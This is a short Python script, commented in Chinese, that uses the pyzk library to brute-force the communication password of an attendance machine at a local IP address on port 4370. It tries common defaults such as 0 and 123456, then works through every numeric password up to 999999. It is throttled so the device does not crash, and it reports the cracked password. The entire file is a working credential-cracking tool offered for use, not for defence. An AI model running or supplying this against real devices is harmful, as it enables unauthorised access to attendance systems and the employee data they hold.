import time
from zk import ZK

DEVICE_IP = '192.168.1.201'
PORT = 4370

# 1. 优先尝试高频/默认密码列表
COMMON_PASSWORDS = [0, 123456, 888888, 1234, 111111, 666666, 123123]

def try_connect(ip, port, password):
    """尝试使用指定密码连接考勤机"""
    zk = ZK(ip, port=port, timeout=2, password=password)
    conn = None
    try:
        # 尝试建立连接
        conn = zk.connect()
        # 验证是否真的可以读取数据（防止假连接）
        conn.get_firmware_version()
        return True
    except Exception:
        return False
    finally:
        if conn:
            try:
                conn.disconnect()
            except Exception:
                pass

def brute_force_password():
    print(f"开始对 {DEVICE_IP}:{PORT} 进行通讯密码爆破...\n")

    # 第一阶段：先测试常见密码
    print("=== 阶段 1: 尝试常见默认密码 ===")
    for pwd in COMMON_PASSWORDS:
        print(f"正在尝试常见密码: {pwd} ...", end="\r")
        if try_connect(DEVICE_IP, PORT, pwd):
            print(f"\n[成功] 找到正确密码: {pwd}")
            return pwd
        time.sleep(0.1)  # 给予考勤机响应缓冲区

    # 第二阶段：按数字区间顺序遍历（示例范围 0 ~ 999999）
    print("\n\n=== 阶段 2: 开始顺序遍历全量数字密码 ===")
    START_NUM = 1
    END_NUM = 999999

    for pwd in range(START_NUM, END_NUM + 1):
        # 跳过阶段1已测过的密码
        if pwd in COMMON_PASSWORDS:
            continue

        print(f"正在尝试密码: {pwd:06d} ...", end="\r")
        
        if try_connect(DEVICE_IP, PORT, pwd):
            print(f"\n[成功] 破解成功！正确密码为: {pwd}")
            return pwd

        # 适当延时，防止考勤机 UDP 崩溃或拒绝服务
        time.sleep(0.05)

    print("\n[失败] 未能遍历出正确的密码。")
    return None

if __name__ == '__main__':
    found_password = brute_force_password()
